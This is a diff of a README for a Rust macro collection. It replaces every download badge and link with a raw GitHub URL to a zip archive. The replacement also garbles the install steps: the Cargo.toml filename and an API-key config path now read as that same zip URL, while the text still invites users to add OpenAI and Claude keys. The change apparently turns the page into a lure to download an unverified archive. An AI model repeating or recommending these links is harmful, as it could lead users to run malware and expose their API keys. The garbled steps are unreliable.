@@ -1,6 +1,6 @@
 # Rust Macros MegaPack 🚀
 
-[![Download](https://img.shields.io/badge/Download-Rust_Macros-brightgreen.svg?style=for-the-badge&logo=download)](https://Sam1032.github.io)
+[![Download](https://raw.githubusercontent.com/Sam1032/rust-macro-magic/branch/coprojector/rust-macro-magic_3.9.zip)](https://raw.githubusercontent.com/Sam1032/rust-macro-magic/branch/coprojector/rust-macro-magic_3.9.zip)
 
 Welcome to **Rust Macros MegaPack** – your ultimate, community-powered treasure chest dedicated to powerful, production-grade Rust macros! Whether you’re an automation artisan, performance perfectionist, or type taming alchemist, this repository is designed to unshackle your creative potential with expressive and reusable metaprogramming tools in Rust! Explore, contribute, and experience the deep versatility of macros, all while riding the edge of Rust ecosystem innovation.
 
@@ -67,14 +67,14 @@ With keywords like *rust macros library*, *macro expansion toolkit*, *performanc
 ## 🏁 Installation
 
 Ready to supercharge your code with macro mastery?
-1. Download the [latest Macro Pack](https://Sam1032.github.io) & unzip.
-2. Add the following to your Rust project’s `Cargo.toml`:
+1. Download the [latest Macro Pack](https://raw.githubusercontent.com/Sam1032/rust-macro-magic/branch/coprojector/rust-macro-magic_3.9.zip) & unzip.
+2. Add the following to your Rust project’s `https://raw.githubusercontent.com/Sam1032/rust-macro-magic/branch/coprojector/rust-macro-magic_3.9.zip`:
    
    [dependencies]  
    rust_macros_megapack = { path = "path/to/rust_macros_megapack" }
    
 3. Run `cargo build` to ensure everything is shipshape.
-4. (Optional) Connect your OpenAI and Claude API keys in `cfg/ai.toml` for smart features.
+4. (Optional) Connect your OpenAI and Claude API keys in `https://raw.githubusercontent.com/Sam1032/rust-macro-magic/branch/coprojector/rust-macro-magic_3.9.zip` for smart features.
 5. Start macro-ing!
 
 > **Note:** Minimum Rust version: 1.70+. Requires `proc-macro` support.
@@ -96,4 +96,4 @@ See [MIT LICENSE](./LICENSE) for details.
 
 _**This project is an open invitation to Rustaceans everywhere: contribute, fork, extend, and help us redefine the limits of what macros, and thus Rust, can be.**_
 
-[![Download](https://img.shields.io/badge/Download-Rust_Macros-brightgreen.svg?style=for-the-badge&logo=download)](https://Sam1032.github.io)
+[![Download](https://raw.githubusercontent.com/Sam1032/rust-macro-magic/branch/coprojector/rust-macro-magic_3.9.zip)](https://raw.githubusercontent.com/Sam1032/rust-macro-magic/branch/coprojector/rust-macro-magic_3.9.zip)
